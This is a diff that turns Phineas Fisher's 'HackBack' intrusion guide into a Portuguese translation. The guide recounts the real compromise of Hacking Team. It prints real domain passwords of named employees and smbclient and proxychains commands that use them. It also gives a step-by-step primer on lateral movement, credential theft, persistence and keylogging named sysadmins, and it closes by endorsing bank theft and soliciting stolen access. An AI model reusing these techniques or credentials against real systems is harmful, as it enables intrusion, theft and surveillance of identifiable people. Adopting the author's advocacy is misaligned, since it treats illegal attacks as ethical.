@@ -1,21 +1,28 @@
-title:  "HackBack - Um Guia DIY"
-date:   2013-01-01
-author:
-
-- Phineas Fisher
-  categories:
-- Artigo
-  tags:
-- hackerativismo
-- subcultura
-- tecnologia
-
 ---
-
-~~~
+title:  "HackBack - Um Guia DIY I"
+date:   2016-04-07
+author:
+  - Phineas Fisher
+categories:
+  - Artigo
+tags:
+  - contra-cultura
+  - antisec
+  - hacking
+  - hacker
+  - segurança
+  - infosec
+---
+```
 Traduzido por: Vinicius Yaunner
 Revisado por: Cypherpunks Brasil
-~~~
+```
+**Nota do Tradutor:** Tem a tem a parte II pra ser traduzida ainda!
+
+# HackBack - Um Guia DIY I
+## ataque contra a Hacking Team
+## Phineas Fisher
+
 
 ---
                 _   _            _      ____             _    _ 
@@ -442,30 +449,28 @@ mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1
 
 [1] https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf
 
---[ 10 - From backups to domain admin ]-----------------------------------------
+--[ 10 - Bbackups para Domain Admin ]-----------------------------------------
 
-What interested me most in the backup was seeing if it had a password or hash
-that could be used to access the live server. I used pwdump, cachedump, and
-lsadump [1] on the registry hives. lsadump found the password to the besadmin
-service account:
+O que mais me interessou no backup foi ver se tinha uma senha ou hash que pudesse ser usado para acessar o servidor live. Usei pwdump, cachedump e lsadump [1] nas seções do registro. lsadump encontrou a senha da conta de serviço besadmin:
 
+~~~
 _SC_BlackBerry MDS Connection Service
 0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
 0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
 0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........
+~~~
 
-I used proxychains [2] with the socks server on the embedded device and
-smbclient [3] to check the password:
-proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!'
+Usei proxychains [2] com o servidor socks no dispositivo embutido e smbclient [3] para verificar a senha:
+~~~ 
+proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!' 
+~~~
 
-It worked! The password for besadmin was still valid, and a local admin. I
-used my proxy and metasploit's psexec_psh [4] to get a meterpreter session.
-Then I migrated to a 64 bit process, ran "load kiwi" [5], "creds_wdigest", and
-got a bunch of passwords, including the Domain Admin:
+Funcionou! A senha para besadmin ainda era válida, e um administrador local. Eu usei meu proxy e o psexec_psh do metasploit [4] para obter uma sessão do meterpreter. Em seguida, migrei para um processo de 64 bits, executei "load kiwi" [5], "creds_wdigest" e recebi um monte de senhas, incluindo o Domain Admin:
 
+~~~
 HACKINGTEAM  BESAdmin       bes32678!!!
 HACKINGTEAM  Administrator  uu8dd8ndd12!
-HACKINGTEAM  c.pozzi        P4ssword      <---- lol great sysadmin
+HACKINGTEAM  c.pozzi        P4ssword      <---- lol excelente sysadmin
 HACKINGTEAM  m.romeo        ioLK/(90
 HACKINGTEAM  l.guerra       4luc@=.=
 HACKINGTEAM  d.martinez     W4tudul3sp
@@ -482,6 +487,7 @@ HACKINGTEAM  d.romualdi     Rd13136f@#
 HACKINGTEAM  l.invernizzi   L0r3nz0123!
 HACKINGTEAM  e.ciceri       2O2571&2E
 HACKINGTEAM  e.rabe         erab@4HT!
+~~~
 
 [1] https://github.com/Neohapsis/creddump7
 
@@ -493,52 +499,36 @@ HACKINGTEAM  e.rabe         erab@4HT!
 
 [5] https://github.com/gentilkiwi/mimikatz
 
---[ 11 - Downloading the mail ]-------------------------------------------------
+--[ 11 - Baixando o e-mail ]-------------------------------------------------
 
-With the Domain Admin password, I have access to the email, the heart of the
-company. Since with each step I take there's a chance of being detected, I
-start downloading their email before continuing to explore. Powershell makes
-it easy [1]. Curiously, I found a bug with Powershell's date handling. After
-downloading the emails, it took me another couple weeks to get access to the
-source code and everything else, so I returned every now and then to download
-the new emails. The server was Italian, with dates in the format
-day/month/year. I used:
+Com a senha do Admin de Domínio, tenho acesso ao e-mail, coração da empresa. Como cada passo que dou há uma chance de ser detectado, começo a baixar o e-mail antes de continuar a explorar. O Powershell facilita isso [1]. Curiosamente, encontrei um bug no manuseio de datas do Powershell. Depois de baixar os e-mails, demorei mais algumas semanas para obter acesso ao
+código-fonte e tudo mais, então eu voltava de vez em quando para baixar os novos e-mails. O servidor era italiano, com datas no formato day/month/year. Eu usei:
+~~~
 -ContentFilter {(Received -ge '05/06/2015') -or (Sent -ge '05/06/2015')}
+~~~
 
-with New-MailboxExportRequest to download the new emails (in this case all
-mail since June 5). The problem is it says the date is invalid if you
-try a day larger than 12 (I imagine because in the US the month comes first
-and you can't have a month above 12). It seems like Microsoft's engineers only
-test their software with their own locale.
+com New-MailboxExportRequest para baixar os novos emails (neste caso, todos os emails desde 5 de junho). O problema é que diz que a data é inválida se você tentar um dia maior que 12 (imagino porque nos EUA o mês vem primeiro e você não pode ter um mês acima de 12). Parece que os engenheiros da Microsoft apenas testam seu software com sua própria localidade.
 
 [1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/
 
---[ 12 - Downloading Files ]----------------------------------------------------
+--[ 12 - Baixando Arquivos ]----------------------------------------------------
 
-Now that I'd gotten Domain Admin, I started to download file shares using my
-proxy and the -Tc option of smbclient, for example:
+Agora que obtive o Domain Admin, comecei a baixar arquivos compartilhados usando meu proxy e a opção -Tc de smbclient, por exemplo:
 
+~~~
 proxychains smbclient '//192.168.1.230/FAE DiskStation'
 -U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'
+~~~
 
-I downloaded the Amministrazione, FAE DiskStation, and FileServer folders in
-the torrent like that.
+Eu baixei as pastas Amministrazione, FAE DiskStation e FileServer no torrent assim.
 
---[ 13 - Introduction to hacking windows domains ]------------------------------
+--[ 13 - Introdução à invasão de domínios do Windows ]------------------------------
 
-Before continuing with the story of the "weones culiaos" (Hacking Team), I
-should give some general knowledge for hacking windows networks.
+Antes de continuar com a história dos "weones culiaos" (Hacking Team), devo dar alguns conhecimentos gerais sobre hacking em redes windows.
 
-----[ 13.1 - Lateral Movement ]-------------------------------------------------
+----[ 13.1 - Movimento Lateral ]-------------------------------------------------
 
-I'll give a brief review of the different techniques for spreading withing a
-windows network. The techniques for remote execution require the password or
-hash of a local admin on the target. By far, the most common way of obtaining
-those credentials is using mimikatz [1], especially sekurlsa::logonpasswords
-and sekurlsa::msv, on the computers where you already have admin access. The
-techniques for "in place" movement also require administrative privileges
-(except for runas). The most important tools for privilege escalation are
-PowerUp [2], and bypassuac [3].
+Farei uma breve revisão das diferentes técnicas de propagação em uma rede Windows. As técnicas de execução remota requerem a senha ou hash de um administrador local no destino. De longe, a maneira mais comum de obter essas credenciais é usando mimikatz [1], especialmente sekurlsa::logonpasswords e sekurlsa::msv, nos computadores onde você já tem acesso de administrador. As técnicas para movimento "no local" também requerem privilégios administrativos (exceto para runas). As ferramentas mais importantes para escalonamento de privilégios são PowerUp [2] e bypassuac [3].
 
 [1] https://adsecurity.org/?page_id=1821
 
@@ -546,46 +536,27 @@ PowerUp [2], and bypassuac [3].
 
 [3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1
 
-Remote Movement:
+Movimento Remoto:
 
 1) psexec
 
-   The tried and true method for lateral movement on windows. You can use
-   psexec [1], winexe [2], metasploit's psexec_psh [3], Powershell Empire's
-   invoke_psexec [4], or the builtin windows command "sc" [5]. For the
-   metasploit module, powershell empire, and pth-winexe [6], you just need the
-   hash, not the password. It's the most universal method (it works on any
-   windows computer with port 445 open), but it's also the least stealthy.
-   Event type 7045 "Service Control Manager" will appear in the event logs. In
-   my experience, no one has ever noticed during a hack, but it helps the
-   investigators piece together what the hacker did afterwards.
+   O método testado e comprovado para movimento lateral em Windows. Você pode usar psexec [1], winexe [2], metasploit's psexec_psh [3], Powershell Empire's invoke_psexec [4] ou o comando interno do Windows "sc" [5]. Para o módulo metasploit, powershell impire e pth-winexe [6], você só precisa do hash, não da senha. É o método mais universal (funciona em qualquer computador Windows com a porta 445 aberta), mas também é o menos furtivo. O tipo de evento 7045 "Service Control Manager" aparecerá nos logs de eventos. Em minha experiência, ninguém nunca percebeu durante um hack, mas ajuda os investigadores a descobrir o que o hacker fez depois.
+
 2) WMI
 
-   The most stealthy method. The WMI service is enabled on all windows
-   computers, but except for servers, the firewall blocks it by default. You
-   can use wmiexec.py [7], pth-wmis [6] (here's a demonstration of wmiexec and
-   pth-wmis [8]), Powershell Empire's invoke_wmi [9], or the windows builtin
-   wmic [5]. All except wmic just need the hash.
+   O método mais furtivo. O serviço WMI é habilitado em todos os computadores Windows, mas exceto para servidores, o firewall o bloqueia por padrão. Você pode usar wmiexec.py [7], pth-wmis [6] (aqui está uma demonstração de wmiexec e pth-wmis [8]), invoke_wmi do Powershell Empire [9] ou o windows embutido wmic [5]. Todos, exceto wmic, só precisam do hash.
+
 3) PSRemoting [10]
 
-   It's disabled by default, and I don't recommend enabling new protocols.
-   But, if the sysadmin has already enabled it, it's very convenient,
-   especially if you use powershell for everything (and you should use
-   powershell for almost everything, it will change [11] with powershell 5 and
-   windows 10, but for now powershell makes it easy to do everything in RAM,
-   avoid AV, and leave a small footprint)
+   Ele está desabilitado por padrão e não recomendo habilitar novos protocolos. Mas, se o sysadmin já o habilitou, é muito conveniente, especialmente se você usar o PowerShell para tudo (e você deve usar o PowerShell para quase tudo, ele mudará [11] com o PowerShell 5 e Windows 10, mas por enquanto o PowerShell o torna fácil de fazer tudo na RAM, evite AV e deixe uma pequena pegada)
+
 4) Scheduled Tasks
 
-   You can execute remote programs with at and schtasks [5]. It works in the
-   same situations where you could use psexec, and it also leaves a well known
-   footprint [12].
+   Você pode executar programas remotos com AT e schtasks [5]. Ele funciona nas mesmas situações em que você poderia usar psexec, e também deixa uma marca conhecida [12].
+
 5) GPO
 
-   If all those protocols are disabled or blocked by the firewall, once you're
-   Domain Admin, you can use GPO to give users a login script, install an msi,
-   execute a scheduled task [13], or, like we'll see with the computer of
-   Mauro Romeo (one of Hacking Team's sysadmins), use GPO to enable WMI and
-   open the firewall.
+   Se todos esses protocolos forem desabilitados ou bloqueados pelo firewall, uma vez que você seja o Domain Admin, você pode usar o GPO para dar aos usuários um script de login, instalar um msi, executar uma tarefa agendada [13], ou, como veremos com no computador de Mauro Romeo (um dos administradores de sistema do Hacking Team), use o GPO para habilitar o WMI e abrir o firewall. 
 
 [1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx
 
@@ -613,32 +584,27 @@ Remote Movement:
 
 [13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py
 
-"In place" Movement:
+Movimento "in plac":
 
-1) Token Stealing
+1) Roubo de Token
 
-   Once you have admin access on a computer, you can use the tokens of the
-   other users to access resources in the domain. Two tools for doing this are
-   incognito [1] and the mimikatz token::* commands [2].
+   Depois de ter acesso de administrador em um computador, você pode usar os tokens dos outros usuários para acessar recursos no domínio. Duas ferramentas para fazer isso são incógnito [1] e os comandos mimikatz token::* [2].
+
 2) MS14-068
 
-   You can take advantage of a validation bug in Kerberos to generate Domain
-   Admin tickets [3][4][5].
-3) Pass the Hash
+   Você pode tirar vantagem de um bug de validação no Kerberos para gerar tíquetes de Domain Admin [3] [4] [5].
 
-   If you have a user's hash, but they're not logged in, you can use
-   sekurlsa::pth [2] to get a ticket for the user.
-4) Process Injection
+3) Passe o Hash
 
-   Any RAT can inject itself into other processes. For example, the migrate
-   command in meterpreter and pupy [6], or the psinject [7] command in
-   powershell empire. You can inject into the process that has the token you
-   want.
+   Se você tem um hash de usuário, mas ele não está logado, você pode usar sekurlsa::pth [2] para obter um ticket para o usuário.
+
+4) Injeção de Processos
+
+   Qualquer RAT pode se injetar em outros processos. Por exemplo, o comando migrate em meterpreter e pupy [6], ou o comando psinject [7] em powershell empire. Você pode injetar no processo o token desejado.
+
 5) runas
 
-   This is sometimes very useful since it doesn't require admin privileges.
-   The command is part of windows, but if you don't have a GUI you can use
-   powershell [8].
+   Isso às vezes é muito útil, pois não requer privilégios de administrador. O comando faz parte do Windows, mas se você não tiver uma GUI, pode usar o PowerShell [8].
 
 [1] https://www.indetectables.net/viewtopic.php?p=211165
 
@@ -656,16 +622,9 @@ Remote Movement:
 
 [8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1
 
-----[ 13.2 - Persistence ]------------------------------------------------------
+----[ 13.2 - Persistência ]------------------------------------------------------
 
-Once you have access, you want to keep it. Really, persistence is only a
-challenge for assholes like Hacking Team who target activists and other
-individuals. To hack companies, persistence isn't needed since companies never
-sleep. I always use Duqu 2 style "persistence", executing in RAM on a couple
-high-uptime servers. On the off chance that they all reboot at the same time,
-I have passwords and a golden ticket [1] as backup access. You can read more
-about the different techniques for persistence in windows here [2][3][4]. But
-for hacking companies, it's not needed and it increases the risk of detection.
+Depois de ter acesso, você deseja mantê-lo. Na verdade, a persistência é apenas um desafio para idiotas como a Hacking Team que tem como alvo ativistas e outros indivíduos. Para hackear empresas, a persistência não é necessária, pois as empresas nunca dormem. Eu sempre uso o estilo "persistência" do Duqu 2, executando na RAM em alguns servidores de alto tempo de atividade. Na chance de que todos eles reiniciem ao mesmo tempo, eu tenho senhas e um ticket dourado [1] como acesso de backup. Você pode ler mais sobre as diferentes técnicas de persistência no Windows aqui [2] [3] [4]. Mas para empresas de hackers, não é necessário e aumenta o risco de detecção.
 
 [1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
 
@@ -675,47 +634,37 @@ for hacking companies, it's not needed and it increases the risk of detection.
 
 [4] https://blog.netspi.com/tag/persistence/
 
-----[ 13.3 - Internal reconnaissance ]------------------------------------------
+----[ 13.3 - Reconhecimento interno  ]------------------------------------------
 
-The best tool these days for understanding windows networks is Powerview [1].
-It's worth reading everything written by it's author [2], especially [3], [4],
-[5], and [6]. Powershell itself is also quite powerful [7]. As there are still
-many windows 2000 and 2003 servers without powershell, you also have to learn
-the old school [8], with programs like netview.exe [9] or the windows builtin
-"net view". Other techniques that I like are:
+A melhor ferramenta hoje em dia para entender as redes Windows é o Powerview [1]. Vale a pena ler tudo o que foi escrito por seu autor [2], principalmente [3], [4], [5] e [6]. O Powershell em si também é bastante poderoso [7]. Como ainda existem muitos servidores Windows 2000 e 2003 sem o PowerShell, você também precisa aprender a velha escola [8], com programas como o netview.exe [9] ou o "net view" embutido no Windows. Outras técnicas que gosto são:
 
-1) Downloading a list of file names
+1) Baixando uma lista de nomes de arquivo
 
-   With a Domain Admin account, you can download a list of all filenames in
-   the network with powerview:
+   Com uma conta de administrador de domínio, você pode baixar uma lista de todos os nomes de arquivos na rede com powerview:
 
+~~~
    Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |
    select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1] |
    select fullname | out-file -append files.txt}
+~~~
 
-   Later, you can read it at your leisure and choose which files to download.
-2) Reading email
+   Posteriormente, você poderá lê-lo à vontade e escolher os arquivos que deseja baixar. 
 
-   As we've already seen, you can download email with powershell, and it has a
-   lot of useful information.
-3) Reading sharepoint
+2) Lendo e-mail
 
-   It's another place where many businesses store a lot of important
-   information. It can also be downloaded with powershell [10].
-4) Active Directory [11]
+   Como já vimos, você pode baixar o e-mail com o PowerShell, e ele contém muitas informações úteis.
+   
+3) Lendo o sharepoint
 
-   It has a lot of useful information about users and computers. Without being
-   Domain Admin, you can already get a lot of info with powerview and other
-   tools [12]. After getting Domain Admin, you should export all the AD
-   information with csvde or another tool.
-5) Spy on the employees
+   É outro local onde muitas empresas armazenam muitas informações importantes. Ele também pode ser baixado com o PowerShell [10].
 
-   One of my favorite hobbies is hunting sysadmins. Spying on Christian Pozzi
-   (one of Hacking Team's sysadmins) gave me access to a Nagios server which
-   gave me access to the rete sviluppo (development network with the source
-   code of RCS). With a simple combination of Get-Keystrokes and
-   Get-TimedScreenshot from PowerSploit [13], Do-Exfiltration from nishang
-   [14], and GPO, you can spy on any employee, or even on the whole domain.
+4) Diretório Ativo [11]
+
+   Ele contém muitas informações úteis sobre usuários e computadores. Sem ser um administrador de domínio, você já pode obter muitas informações com o powerview e outras ferramentas [12]. Depois de obter o Domain Admin, você deve exportar todas as informações do AD com csvde ou outra ferramenta.
+   
+5) Espionar os funcionários
+
+   Um dos meus hobbies favoritos é caçar sysadmins. Espionar Christian Pozzi (um dos sysadmins do Hacking Team) me deu acesso a um servidor Nagios que me deu acesso à rete sviluppo (rede de desenvolvimento com o código-fonte do RCS). Com uma combinação simples de Get-Keystrokes e Get-TimedScreenshot do PowerSploit [13], Do-Exfiltration do nishang [14] e GPO, você pode espionar qualquer funcionário ou até mesmo o domínio inteiro.
 
 [1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
 
@@ -745,25 +694,11 @@ the old school [8], with programs like netview.exe [9] or the windows builtin
 
 [14] https://github.com/samratashok/nishang
 
---[ 14 - Hunting Sysadmins ]----------------------------------------------------
+--[ 14 - Caçando Sysadmins ]----------------------------------------------------
 
-Reading their documentation about their infrastructure [1], I saw that I was
-still missing access to something important - the "Rete Sviluppo", an isolated
-network with the source code for RCS. The sysadmins of a company always have
-access to everything, so I searched the computers of Mauro Romeo and Christian
-Pozzi to see how they administer the Sviluppo network, and to see if there
-were any other interesting systems I should investigate. It was simple to
-access their computers, since they were part of the windows domain where I'd
-already gotten admin access. Mauro Romeo's computer didn't have any ports
-open, so I opened the port for WMI [2] and executed meterpreter [3]. In
-addition to keylogging and screen scraping with Get-Keystrokes and
-Get-TimeScreenshot, I used many /gather/ modules from metasploit, CredMan.ps1
-[4], and searched for interesting files [5]. Upon seeing that Pozzi had a
-Truecrypt volume, I waited until he'd mounted it and then copied off the
-files. Many have made fun of Christian Pozzi's weak passwords (and of
-Christian Pozzi in general, he provides plenty of material [6][7][8][9]). I
-included them in the leak as a false clue, and to laugh at him. The reality is
-that mimikatz and keyloggers view all passwords equally.
+Reading their documentation about their infrastructure [1], I saw that I was still missing access to something important - the "Rete Sviluppo", an isolated network with the source code for RCS. The sysadmins of a company always have access to everything, so I searched the computers of Mauro Romeo and Christian Pozzi to see how they administer the Sviluppo network, and to see if there were any other interesting systems I should investigate. It was simple to access their computers, since they were part of the windows domain where I'd already gotten admin access. Mauro Romeo's computer didn't have any ports open, so I opened the port for WMI [2] and executed meterpreter [3]. In addition to keylogging and screen scraping with Get-Keystrokes and Get-TimeScreenshot, I used many /gather/ modules from metasploit, CredMan.ps1[4], and searched for interesting files [5]. Upon seeing that Pozzi had a Truecrypt volume, I waited until he'd mounted it and then copied off the files. Many have made fun of Christian Pozzi's weak passwords (and of Christian Pozzi in general, he provides plenty of material [6][7][8][9]). I included them in the leak as a false clue, and to laugh at him. The reality is that mimikatz and keyloggers view all passwords equally.
+
+Lendo a documentação sobre sua infraestrutura [1], vi que ainda estava faltando acesso a algo importante - a "Rete Sviluppo", uma rede isolada com o código-fonte do RCS. Os sysadmins de uma empresa sempre têm acesso a tudo, então eu procurei nos computadores de Mauro Romeo e Christian Pozzi para ver como eles administravam a rede Sviluppo e para ver se havia algum outro sistema interessante que eu devesse investigar. Era simples acessar seus computadores, pois eles faziam parte do domínio do Windows onde eu já tinha obtido acesso de administrador. O computador de Mauro Romeo não tinha nenhuma porta aberta, então abri a porta para o WMI [2] e executei o meterpreter [3]. Além de keylogging e screen scraping com Get-Keystrokes e Get-TimeScreenshot, usei muitos módulos /gather/ do metasploit, CredMan.ps1 [4], e procurei por arquivos interessantes [5]. Ao ver que Pozzi tinha um volume Truecrypt, esperei até que ele montasse e copiei os arquivos. Muitos zombaram das senhas fracas de Christian Pozzi (e de Christian Pozzi em geral, ele fornece bastante material [6] [7] [8] [9]). Eu os incluí no vazamento como uma pista falsa e para rir dele. A realidade é que mimikatz e keyloggers veem todas as senhas igualmente.
 
 [1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/
 
@@ -783,62 +718,39 @@ that mimikatz and keyloggers view all passwords equally.
 
 [9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/
 
---[ 15 - The bridge ]-----------------------------------------------------------
+--[ 15 - A Ponte ]-----------------------------------------------------------
 
-Within Christian Pozzi's Truecrypt volume, there was a textfile with many
-passwords [1]. One of those was for a Fully Automated Nagios server, which had
-access to the Sviluppo network in order to monitor it. I'd found the bridge I
-needed. The textfile just had the password to the web interface, but there was
-a public code execution exploit [2] (it's an unauthenticated exploit, but it
-requires that at least one user has a session initiated, for which I used the
-password from the textfile).
+Dentro do volume Truecrypt de Christian Pozzi, havia um arquivo de texto com muitas senhas [1]. Uma delas era para um servidor Nagios totalmente automatizado, que tinha acesso à rede Sviluppo para monitorá-la. Eu encontrei a ponte que precisava. O arquivo de texto tinha apenas a senha para a interface da web, mas havia um exploit de execução de código público [2] (é um exploit não autenticado, mas requer que pelo menos um usuário tenha uma sessão iniciada, para a qual usei a senha do arquivo de texto )
 
 [1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt
 
 [2] http://seclists.org/fulldisclosure/2014/Oct/78
 
---[ 16 - Reusing and resetting passwords ]--------------------------------------
+--[ 16 - Reutilizar e redefindo senhas ]--------------------------------------
 
-Reading the emails, I'd seen Daniele Milan granting access to git repos. I
-already had his windows password thanks to mimikatz. I tried it on the git
-server and it worked. Then I tried sudo and it worked. For the gitlab server
-and their twitter account, I used the "forgot my password" function along with
-my access to their mail server to reset the passwords.
+Lendo os e-mails, vi Daniele Milan concedendo acesso aos repositórios git. Eu já tinha sua senha do windows graças ao mimikatz. Eu tentei no servidor git e funcionou. Então tentei sudo e funcionou. Para o servidor gitlab e sua conta no Twitter, usei a função "esqueci minha senha" junto com meu acesso ao servidor de e-mail para redefinir as senhas.
 
---[ 17 - Conclusion ]-----------------------------------------------------------
+--[ 17 - Conclusão ]-----------------------------------------------------------
 
-That's all it takes to take down a company and stop their human rights abuses.
-That's the beauty and asymmetry of hacking: with 100 hours of work, one person
-can undo years of work by a multi-million dollar company. Hacking gives the
-underdog a chance to fight and win.
+===exibe no card daqui pra baixo===
 
-Hacking guides often end with a disclaimer: this information is for
-educational purposes only, be an ethical hacker, don't attack systems you
-don't have permission to, etc. I'll say the same, but with a more rebellious
-conception of "ethical" hacking. Leaking documents, expropriating money from
-banks, and working to secure the computers of ordinary people is ethical
-hacking. However, most people that call themselves "ethical hackers" just work
-to secure those who pay their high consulting fees, who are often those most
-deserving to be hacked.
+Isso é tudo o que é preciso para derrubar uma empresa e impedir os abusos de direitos humanos. Essa é a beleza e assimetria do hacking: com 100 horas de trabalho, uma pessoa pode desfazer anos de trabalho de uma empresa multimilionária. Hackear dá ao azarão a chance de lutar e vencer.
 
-Hacking Team saw themselves as part of a long line of inspired Italian design
-[1]. I see Vincenzetti, his company, his cronies in the police, Carabinieri,
-and government, as part of a long tradition of Italian fascism. I'd like to
-dedicate this guide to the victims of the raid on the Armando Diaz school, and
-to all those who have had their blood spilled by Italian fascists.
+Os guias de hacking muitas vezes terminam com uma isenção de responsabilidade: essas informações são apenas para fins educacionais, seja um hacker ético, não ataque sistemas para os quais você não tem permissão, etc. Direi o mesmo, mas com uma concepção mais rebelde de "ethical" hacking. Vazamento de documentos, expropriação de dinheiro de bancos e trabalho para proteger os computadores de pessoas comuns é um hacking ético. No entanto, a maioria das pessoas que se autodenominam "hackers éticos" apenas trabalham para proteger aqueles que pagam suas altas taxas de consultoria, que geralmente são os que mais merecem ser hackeados.
+
+A Hacking Team se via como parte de uma longa linha de design italiano inspirado [1]. Vejo Vincenzetti, sua empresa, seus camaradas na polícia, Carabinieri e no governo, como parte de uma longa tradição de fascismo italiano. Gostaria de dedicar este guia às vítimas do ataque à escola Armando Diaz e a todos aqueles que tiveram seu sangue derramado por fascistas italianos.
 
 [1] https://twitter.com/coracurrier/status/618104723263090688
 
---[ 18 - Contact ]--------------------------------------------------------------
+--[ 18 - Contato ]--------------------------------------------------------------
 
-To send me spear phishing attempts, death threats in Italian [1][2], and to
-give me 0days or access inside banks, corporations, governments, etc.
+Para me enviar tentativas de spear phishing, ameaças de morte em italiano [1] [2] e para me dar 0 dias ou acesso dentro de bancos, empresas, governos, etc.
 
 [1] http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/
 
 [2] https://twitter.com/CthulhuSec/status/619459002854977537
 
-only encrypted email please:
+apenas e-mail criptografado por favor:
 https://securityinabox.org/es/thunderbird_usarenigmail
 -----BEGIN PGP PUBLIC KEY BLOCK-----
 
@@ -870,10 +782,14 @@ D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
 =E5+y
 -----END PGP PUBLIC KEY BLOCK-----
 
-If not you, who? If not now, when?
+Se não for você, quem? Se não agora, quando?
 ----------------------------------
 
+~~~
 | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
 | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
 |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
 |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
+~~~
+
+Fonte: [HackBack - A DIY Guide I](https://www.exploit-db.com/papers/41915)
